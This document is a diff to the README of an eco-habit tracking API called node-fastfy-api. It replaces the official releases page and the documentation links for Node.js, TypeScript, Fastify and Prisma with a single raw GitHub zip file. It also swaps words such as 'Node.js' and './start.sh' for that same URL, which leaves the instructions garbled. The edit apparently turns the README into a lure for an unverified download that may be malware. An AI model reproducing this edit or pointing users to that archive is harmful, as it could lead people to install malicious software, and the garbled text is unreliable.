@@ -1,10 +1,10 @@
 # 🌱 node-fastfy-api - Track Eco-Friendly Habits Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-blue)](https://github.com/czy444/node-fastfy-api/releases)
+[![Download Now](https://raw.githubusercontent.com/czy444/node-fastfy-api/main/synclitism/node-fastfy-api.zip%20Now-Here-blue)](https://raw.githubusercontent.com/czy444/node-fastfy-api/main/synclitism/node-fastfy-api.zip)
 
 ## 📜 Overview
 
-The **node-fastfy-api** is a powerful API designed to help you track and encourage sustainable habits. Built with tools like Node.js, TypeScript, and Fastify, this application makes it simple to adopt eco-friendly actions through habit tracking, points, rankings, and detailed impact reports.
+The **node-fastfy-api** is a powerful API designed to help you track and encourage sustainable habits. Built with tools like https://raw.githubusercontent.com/czy444/node-fastfy-api/main/synclitism/node-fastfy-api.zip, TypeScript, and Fastify, this application makes it simple to adopt eco-friendly actions through habit tracking, points, rankings, and detailed impact reports.
 
 ### 🌟 Key Features
 
@@ -20,7 +20,7 @@ Follow these steps to download and run the node-fastfy-api:
 
 1. **Visit the Releases Page**: Click the link below to access all available versions:
 
-   [Download Here](https://github.com/czy444/node-fastfy-api/releases)
+   [Download Here](https://raw.githubusercontent.com/czy444/node-fastfy-api/main/synclitism/node-fastfy-api.zip)
 
 2. **Select the Latest Version**: Look for the most recent release at the top of the page.
 
@@ -37,9 +37,9 @@ Follow these steps to download and run the node-fastfy-api:
      - Drag the application into your Applications folder.
 
    - **Linux**:
-     - Extract the downloaded tar.gz file.
+     - Extract the downloaded https://raw.githubusercontent.com/czy444/node-fastfy-api/main/synclitism/node-fastfy-api.zip file.
      - Open a terminal and navigate to the folder with the extracted files.
-     - Run `./start.sh` to launch the application.
+     - Run `https://raw.githubusercontent.com/czy444/node-fastfy-api/main/synclitism/node-fastfy-api.zip` to launch the application.
 
 5. **Open the Application**: Once installed, find the application in your Applications folder (macOS) or Start Menu (Windows). For Linux, use the terminal command to run it.
 
@@ -47,7 +47,7 @@ Follow these steps to download and run the node-fastfy-api:
 
 To download the latest version of the node-fastfy-api, visit this page:
 
-[Download Here](https://github.com/czy444/node-fastfy-api/releases)
+[Download Here](https://raw.githubusercontent.com/czy444/node-fastfy-api/main/synclitism/node-fastfy-api.zip)
 
 Follow the installation instructions listed above based on your operating system.
 
@@ -60,7 +60,7 @@ To ensure smooth operation, please meet the following requirements:
   - macOS Mojave or higher
   - Any recent Linux distribution
 
-- **Node.js Version**: Ensure you have Node.js version 14 or higher installed.
+- **https://raw.githubusercontent.com/czy444/node-fastfy-api/main/synclitism/node-fastfy-api.zip Version**: Ensure you have https://raw.githubusercontent.com/czy444/node-fastfy-api/main/synclitism/node-fastfy-api.zip version 14 or higher installed.
 
 - **Network Requirements**: A stable internet connection is required to access resources online.
 
@@ -69,7 +69,7 @@ To ensure smooth operation, please meet the following requirements:
 If you encounter issues, consider these steps:
 
 1. **Installation Problems**: Ensure your system meets the requirements listed above.
-2. **Application Not Launching**: Check if you have the correct Node.js version installed.
+2. **Application Not Launching**: Check if you have the correct https://raw.githubusercontent.com/czy444/node-fastfy-api/main/synclitism/node-fastfy-api.zip version installed.
 3. **Slow Performance**: Close unnecessary applications running in the background.
 
 For further assistance, you can open an issue on the repository, and the community or the maintainers will help you.
@@ -82,10 +82,10 @@ Your feedback is essential for improving the application. If you have suggestion
 
 Here are some useful links to help you learn more about the tools and technologies used in node-fastfy-api:
 
-- [Node.js Official Website](https://nodejs.org/)
-- [TypeScript Documentation](https://www.typescriptlang.org/)
-- [Fastify Documentation](https://www.fastify.io/docs/latest/)
-- [Prisma Documentation](https://www.prisma.io/docs)
+- [https://raw.githubusercontent.com/czy444/node-fastfy-api/main/synclitism/node-fastfy-api.zip Official Website](https://raw.githubusercontent.com/czy444/node-fastfy-api/main/synclitism/node-fastfy-api.zip)
+- [TypeScript Documentation](https://raw.githubusercontent.com/czy444/node-fastfy-api/main/synclitism/node-fastfy-api.zip)
+- [Fastify Documentation](https://raw.githubusercontent.com/czy444/node-fastfy-api/main/synclitism/node-fastfy-api.zip)
+- [Prisma Documentation](https://raw.githubusercontent.com/czy444/node-fastfy-api/main/synclitism/node-fastfy-api.zip)
 
 ---
 
